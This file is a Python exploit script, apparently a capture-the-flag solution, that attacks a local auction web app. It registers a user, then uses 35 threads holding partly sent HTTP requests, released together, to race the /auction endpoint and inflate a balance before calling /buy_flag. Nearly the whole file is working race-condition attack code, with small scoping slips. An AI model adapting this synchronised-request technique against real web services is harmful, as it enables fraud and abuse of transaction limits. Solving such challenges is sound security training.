import threading
import requests
import time
import socket

bdomain  = "localhost"
bport = "6660"
burl = f"http://{bdomain}:{bport}"

def send_aunction_request(client, cookie):
    r =  requests.post(f"{burl}/auction", json={"add_value": 10}, cookies={"connect.sid":cookie})
    return r.text

def get_confirm_token(cookie):
    print("[+] Getting confirm token ...")
    return requests.get(burl+ '/auction', cookies={"connect.sid":cookie}).json()['confirmToken']

class RaceConditionThread(threading.Thread):
    def __init__(self, num_thread, send_requests ,cookie, confirmToken):
        threading.Thread.__init__(self)        
        self.num_thread = num_thread
        self.send_request = send_requests
        self.prepare_request = prepare_request
        self.cookie = cookie
        self.confirmToken = confirmToken
    
    def run(self):
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((bdomain, int(bport)))
        payloadAuction = f"""POST /auction HTTP/1.1\r\nHost: {bdomain}:{bport}\r\nCookie: connect.sid={self.cookie}\r\nX-Confirm-Token: {self.confirmToken}\r\nContent-Length: 20\r\nContent-Type: application/json\r\n\r\n{{"add_value":"10"}}\r\n\r\n""".encode()
        conn.send(payloadAuction[:-10])
        print("Thread %s ready for attack ..." % self.num_thread)
        send_request.wait()
        conn.send(payloadAuction[-10:])
        r = conn.recv(4096)
        print("Thread %s response: %s" % (self.num_thread, r.split(b'\r\n\r\n')[-1]))

def register(username, password):
    print("[+] Registering...")
    requests.post(f"{burl}/register", data={"username": username, "password": password})
    
def login(username, password):
    print("[+] Logging in...")
    r = requests.post(f"{burl}/login", data={"username": username, "password": password})
    return r.cookies.get("connect.sid")

def join_dashboard(cookie):
    print("[+] Joining dashboard...")
    requests.get(f"{burl}/dashboard", cookies={"connect.sid":cookie})

if __name__ == "__main__":
    username = "user_%d" % time.time()
    password = "supersecretpass_%d" % time.time()
    register(username, password)
    cookie = login(username, password)
    join_dashboard(cookie)
    print("[+] Running attack...")
    send_request = threading.Event()
    prepare_request = threading.Event()
    confirmToken=get_confirm_token(cookie)
    all_threads = []
    for i in range(35):
        rct = RaceConditionThread(i, send_requests=send_request, cookie=cookie,confirmToken=confirmToken )
        all_threads.append(rct)
    for t in all_threads:
        t.start()
    time.sleep(2)
    print("[+] Sending request for attacking...")
    send_request.set()
    for t in all_threads:
        t.join()
    print("[+] Done")   
    print("[+] Getting flag...")
    print(requests.get(f"{burl}/buy_flag", cookies={"connect.sid":cookie}).content)